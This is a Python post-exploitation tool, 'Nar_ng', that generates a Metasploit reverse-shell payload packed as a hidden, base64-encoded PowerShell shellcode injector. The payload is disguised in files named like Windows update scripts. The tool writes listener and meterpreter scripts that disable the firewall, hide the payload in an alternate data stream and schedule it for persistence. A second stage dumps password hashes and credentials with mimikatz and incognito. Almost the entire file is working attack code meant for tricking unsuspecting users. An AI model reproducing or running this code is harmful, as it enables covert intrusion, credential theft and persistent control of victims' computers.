#!/usr/bin/python3
'''
Nar_ng is a post exploit program.  It will create a couple of initial files that can be used to have the user run on the remote machine to gain access. These files will not exploit the machine, but will call back to a metasploit handler, and this is were then the magic happens.  So befor eth magic can happen:
	1) It will build a metasploit payload/listener and create a Base64 encode powershell script.
	2) It will then take that ps script and put it in a .bat file
	3) It will also create an excel macro that can be added to a carefully crafted excel file.  Once you add the macro to the excel file, then you can add the file to the remote computer to be run at a later time by an unsuspecting user.
	Now for the magic, Once the remote computer calls back:
	1) It will take the psscript add it to an alternat datastream in the %temp% and %appdata% directories. 
	2) The it will create a vbs script to be a wrapper for the ADS. And add those to the %temp% and %appdata% directories.
	3) Then it will create a scheduled task to run the vbs scripts that will run .bat ADS file every few minutes
	4) It will then create a service that auto starts the .vbs or .ps1 script.
	5) Creates a startup cammand in the Registery
	6) It then downloads powercat from the web or from the listening host and excutes is.
	7) Once powercat is running, it will then setup a listener for remote connections
'''

import sys, subprocess, argparse, base64,urllib.request,shutil
from time import sleep

class bcolors:
	RED = '\033[31m'
	YELLOW = '\033[33m'
	BLU = '\033[34m'
	ENDC = '\033[0m'
	CYAN = '\033[96m'
	
class NAR:
	def __init__(self, lhost, payload, lport):
		self.host=lhost
		if self.host=="0":
			self.getIP()
		print(self.host)
		ip = self.host.split('.')
		if len(ip) != 4 or (int(ip[0])<1 or int(ip[0])>223) or int(ip[3]) == 0:
			print("Not a valid IP for a host ")
			exit()
		elif int(ip[0]) < 0 or int(ip[1]) < 0 or int(ip[2]) < 0 or int(ip[3]) < 0:
			print("Not a valid IP for a host")
			exit()
		elif int(ip[0]) > 255 or int(ip[1]) > 255 or int(ip[2]) >255 or int(ip[3]) > 255:
			print("Not a valid IP for a host")
			exit()
		self.payload=payload
		self.port=lport
		if int(self.port) < 0 or int(self.port) > 65535:
			print("Not a valid port number, must be a number 1-65635")
			exit()
	#finds all the IPs on all the interfaces
	def getIP(self):
		z=[]
		a={}
		b=subprocess.getoutput("ifconfig | grep 'inet ' | grep -v 127.0.0.1 | sed 's/netmask.*//' |  sed -e 's/^\w*\ *//' | cut -d' ' -f2").replace(' ','').split("\n")
		c=(subprocess.getoutput("ifconfig | cut -c1-4 | grep -v ' ' | cut -d' ' -f 1")).replace(' ','').split('\n')
		for i in c:
			if i != '':
				z.append(i)
		for i, j in zip(b,z):
			a.update({i:j})
		while(True):
			print("For listening IP:")
			print("1) lo   - 127.0.0.1")
			count=2
			for ip, intface in a.items():
				print(str(count)+') '+intface+' - '+ip)
				count+=1
			x=int(input("Which one will it be?: "))
			if x == 1:
				self.host=("127.0.0.1")
				break
			elif x >= count:
				print("INVALID CHOICE!!! Try again")
			else:
				y = x-2
				self.host=(list(a)[y])
				break
	#vbs script that runs all the commands from an ADS
	#Thanks to Darkoperator for help with vbs and ADS
	def vbsWrapper(self):
		vbs = "Dim msfShell : "
		vbs += "Set msfShell = WScript.CreateObject(\"WScript.Shell\") : "
		vbs += "command = \"cmd /K for /f \"\"delims=,\"\" %i in (%TEMP%\LicnUpdt.h1s:WinUpdate.bat) do %i\" : "
		vbs += "msfShell.Run command, 0 : "
		vbs += "Set msfShell = Nothing"
		vbsload = open("/tmp/WindowsUpdater.vbs", "w")
		vbsload.write(vbs)
		vbsload.close()
	
	#Loads msf listener for the first part
	def load_listen(self):
		options =  "use multi/handler\n"
		options += "set payload %s\n" % (self.payload)
		options += "set LHOST %s\nset LPORT %s\n" % (self.host,self.port)
		options += "set ExitOnSession false\n"
		options += "set InitialAutoRunScript multi_console_command -rc /tmp/meter.rb\n"
		options += "exploit -j\n"
		lwrite = open("/tmp/listener.rc", "w")
		lwrite.write(options)
		lwrite.close()
		
	#Loads msf listener for the second part
	def load_listen2(self):
		options =  "use multi/handler\n"
		options += "set payload %s\n" % (self.payload)
		options += "set LHOST %s\nset LPORT %s\n" % (self.host,self.port)
		options += "set ExitOnSession false\n"
		options += "set AutoRunScript multi_console_command -rc /tmp/meter2.rb\n"
		options += "exploit -j\n"
		lwrite = open("/tmp/listener2.rc", "w")
		lwrite.write(options)
		lwrite.close()
		
	#Starts the 1st listener in msf	 
	def start_listen(self):
		subprocess.Popen("msfconsole -r /tmp/listener.rc", shell=True).wait()
		
	#Starts the 2nd listener in msf
	def start_listen2(self):
		subprocess.Popen("gnome-terminal -e 'msfconsole -r /tmp/listener2.rc'", shell=True).wait()
	
	#First Stage
	def create_meter_script(self):
		options = "upload /tmp/Vrflnc.wcx %TEMP%\n"
		options += "upload /tmp/WinUpdate.bat %TEMP%\n"
		options += "upload /tmp/Vrflnc.wcx %APPDATA%\n"
		options += "upload /tmp/WindowsUpdater.vbs %TEMP%\n"
		options += "run /tmp/wincmd.rb\n"
		meterscript = open("/tmp/meter.rb", "w")
		meterscript.write(options)
		meterscript.close()

	#Second Stage
	def create_meter_script2(self):
		options = "getsystem\n"
		options += "run hashdump\n"
		options += "load mimikatz\n"
		options += "wdigest\n"
		options += "load incognito\n"
		options += "list_tokens -g\n"
		meterscript = open("/tmp/meter2.rb", "w")
		meterscript.write(options)
		meterscript.close()
		
	#Matthew Graeber http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
	#And 
	#Dave Kennedy - Unicorn		
	def ps_attack(self):
		proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s -a x86 --platform windows -f c" % (self.payload, self.host, self.port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		data = proc.communicate()[0]
		data=data.decode('utf-8')
		# start to format this a bit to get it ready
		symbols = {';' , ' ' , '+' , '"' , '\n' , 'buf=' , 'Found 0 compatible encoders' , 'unsignedcharbuf[]='}
		for i in symbols:
		    data=data.replace(i,'')
		data=data.replace('\\x','0x')
		data=','.join([data[j*4:j*4+4] for j in range(int(len(data)/4+1))])
		data=data[:-1]
		
		# one line shellcode injection with native x86 shellcode
		powershell_code = (r"""cls;$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $e"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $e";}""" %  (data))
		full_attack = "powershell -nop -win hidden -noni -enc " + base64.b64encode(powershell_code.encode('utf_16_le')).decode('utf-8')
		fpayload = open("/tmp/Vrflnc.wcx", "w")
		fpayload2 = open("/tmp/WinUpdate.bat", "w")
		fpayload.write(full_attack)
		fpayload2.write(full_attack)
		fpayload.close()
		fpayload2.close()
		
	def winCmd(self):
		winText = "def list_exec(session,cmdlst)\n\tprint_status(\"Running Command List ...\")\n\tr=\"\"\n\tsession.response_timeout=120\n\tcmdlst.each do |cmd|\n\tbegin\n\t\tprint_status \"running command #{cmd}\"\n\t\t\tr = session.sys.process.execute(\"cmd.exe /c #{cmd}\", nil, {\'Hidden\' => true, \'Channelized\' => true})\n\t\t\twhile(d = r.channel.read)\n\t\t\tprint_status(\"t#{d}\")\n\t\t\t\tend\n\t\t\tr.channel.close\n\t\t\tr.close\n\t\t\trescue ::Exception => e\n\t\t\t\tprint_error(\"Error Running Command #{cmd}: #{e.class} #{e}\")\n\t\t\tend\n\t\tend\n\tend\n"
		winText += "commands = ['NetSh Advfirewall set allprofiles state off','ECHO XVPPH-XPHYM-FR7KB-9Y6PPX-KLQP2 > %TEMP%\LicnUpdt.h1s', 'type \"%TEMP%\Vrflnc.wcx\" > %TEMP%\LicnUpdt.h1s:WinUpdate.bat', 'schtasks /create /sc minute /mo 5 /tn \"\" /tr %TEMP%\WindowsUpdater.vbs']\n"
		winText += "list_exec(client,commands)\n"
		fwincmd = open("/tmp/wincmd.rb", "w")
		fwincmd.write(winText)
		fwincmd.close()

arg = argparse.ArgumentParser()
arg._optionals.title = "===HELP==="
req = arg.add_argument_group('Required arguments')
req.add_argument("-l", dest = "lhost", help="Listening Host",default="0")
req.add_argument("-y", dest = "payload", help="Payload(Default=windows/meterpreter/reverse_tcp)", default="windows/meterpreter/reverse_tcp")
req.add_argument("-p",dest ="lport", help="Listening Port", required=True)
opt = arg.add_argument_group('Optional arguments')
opt.add_argument("-m", dest= "macro", help="Macro", default="False")
opt.add_argument("-w", dest = "hta", help="hta", default="False")
opt.add_argument("-c", dest = "cat", help="cat", default="False")
opt.add_argument("--payload_help", help="Lists payloads",default="False")

args = arg.parse_args()
if len(sys.argv) == 1:
	arg.print_help()
x=NAR(args.lhost,args.payload,args.lport)
print(bcolors.CYAN+"[+]"+bcolors.ENDC+" Creating WindowsUpdater.vbs")
x.vbsWrapper()
print(bcolors.CYAN+"[+]"+bcolors.ENDC+" Creating wincmd.rb")
x.winCmd()
print(bcolors.BLU+"[+]"+bcolors.ENDC+" Creating meter.rb")
x.create_meter_script()
print(bcolors.RED+"[+]"+bcolors.ENDC+" Creating meter2.rb")
x.create_meter_script2()
print(bcolors.YELLOW+"[+]"+bcolors.ENDC+" Creating listener.rc")
x.load_listen()
print(bcolors.CYAN+"[+]"+bcolors.ENDC+" Creating listener2.rc")
x.load_listen2()
print(bcolors.BLU+"[+]"+bcolors.ENDC+" Creating ps_attack payload")
x.ps_attack()
print(bcolors.RED+"[+]"+bcolors.ENDC+" Generating Shellcode, this might take a few moments")
x.start_listen()
x.start_listen2()
